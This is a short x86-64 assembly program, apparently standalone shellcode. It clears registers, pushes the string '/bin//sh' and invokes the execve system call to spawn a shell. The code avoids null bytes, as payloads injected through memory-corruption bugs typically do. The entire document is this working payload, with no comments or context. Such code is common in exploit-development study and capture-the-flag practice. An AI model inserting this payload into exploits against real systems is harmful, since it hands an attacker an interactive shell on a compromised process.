	[BITS 64]

	global _start

_start:
	xor rax,rax
	xor rsi,rsi
	xor rdx,rdx

	sub rsp,0x7f

	push rax
	mov rax,"/bin//sh"
	push rax

	push rsp
	pop rdi

	xor rax,rax
	mov al,0x3b
	syscall

